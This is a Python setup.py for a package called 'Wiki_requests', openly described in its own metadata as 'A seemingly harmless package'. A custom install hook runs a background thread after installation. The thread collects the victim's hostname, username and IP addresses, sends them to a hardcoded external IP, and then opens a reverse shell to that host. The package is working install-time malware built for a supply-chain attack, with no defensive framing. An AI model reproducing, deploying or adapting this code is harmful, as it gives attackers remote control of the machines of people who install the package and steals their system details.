from setuptools import setup, find_packages
from setuptools.command.install import install
import socket
import subprocess
import platform
import getpass
import os

try:
    import requests
except ImportError:
    os.system("pip install requests")  # 也可以用 subprocess.call(["pip", "install", "requests"])


# 控制端服务器地址和端口
CONTROL_SERVER_IP = "38.181.219.70"  # 修改为你的控制端IP
CONTROL_SERVER_PORT = 12345          # 你可以自定义一个端口


def get_system_info():
    """收集系统信息"""
    info = {
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.architecture(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "user_ip": socket.gethostbyname(socket.gethostname()),
    }
    try:
        # 尝试获取公网IP（如果可以访问外网）
        info["public_ip"] = requests.get("https://api.ipify.org").text
    except:
        info["public_ip"] = "N/A"
    return info


def send_system_info(info):
    """发送系统信息到控制端"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((CONTROL_SERVER_IP, CONTROL_SERVER_PORT + 1))  # 使用不同的端口发送信息
        s.sendall(str(info).encode())
        s.close()
    except Exception as e:
        print(f"发送信息错误: {e}")


def reverse_shell():
    """创建反向Shell连接"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((CONTROL_SERVER_IP, CONTROL_SERVER_PORT))

        # 重定向标准输入、输出、错误
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # 启动Shell (Windows下通常是cmd.exe, Linux下是/bin/sh)
        if platform.system() == "Windows":
            subprocess.call(["cmd.exe"])  # Windows
        else:
            subprocess.call(["/bin/sh", "-i"])  # Linux

    except Exception as e:
        print(f"创建shell异常：{e}")


class CustomInstallCommand(install):
    """自定义安装命令，在安装后执行恶意代码"""

    def run(self):
        # 先执行标准的安装流程 (重要！否则可能无法正确安装)
        install.run(self)

        # 在后台线程中执行，避免阻塞安装过程
        import threading
        threading.Thread(target=self.my_custom_actions, daemon=True).start()
    
    def my_custom_actions(self):
        # 收集并发送系统信息
        system_info = get_system_info()
        send_system_info(system_info)

        # 尝试创建反向shell
        reverse_shell()



setup(
    name="Wiki_requests",  #  非常重要：替换为一个独一无二的包名！
    version="0.0.1",
    packages=find_packages(),  # 如果你的项目有多个模块，这个会自动包含
    author="ZhangSan",      # 可选：你的名字/昵称
    author_email="your@email.com",  # 可选：你的邮箱
    description="A seemingly harmless package",  # 可选：简短描述
    long_description="A longer description of your package",  # 可选：详细描述
    long_description_content_type="text/markdown",  # 如果长描述是Markdown格式
    url="https://github.com/yourusername/your_package",  # 可选：项目主页
    classifiers=[  # 可选：分类信息，帮助用户找到你的包
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",  # 选择一个开源许可证
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',   # 可选：Python版本要求
    install_requires=[         # 可选：依赖的其他库
        #  'requests',  这里我们已经在代码中处理了requests的安装，所以这里不需要了
    ],
    cmdclass={
        'install': CustomInstallCommand,  #  关键：注册自定义安装命令
    },
)